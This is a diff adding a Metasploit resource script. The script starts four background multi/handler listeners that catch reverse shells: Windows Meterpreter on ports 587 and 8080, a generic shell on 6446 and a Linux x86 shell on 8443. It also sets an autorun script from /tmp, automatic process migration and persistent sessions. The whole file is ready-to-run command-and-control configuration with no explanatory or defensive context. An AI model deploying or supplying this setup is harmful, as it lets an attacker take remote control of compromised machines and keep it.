@@ -1,0 +1,32 @@
+use exploit/multi/handler
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set EXITFUNC thread
+set LHOST 0.0.0.0
+set LPORT 587
+set ExitOnSession false
+set AutoRunScript "/tmp/autorun.rc"
+exploit -j
+
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 6446
+set ExitOnSession false
+set AutoRunScript ""
+exploit -j
+
+set PAYLOAD linux/x86/shell/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8443
+set ExitOnSession false
+set AutoRunScript "" 
+exploit -j
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 8080
+set AutoRunScript migrate -f -k
+set ExitOnSession false
+exploit -j
+
+jobs -v
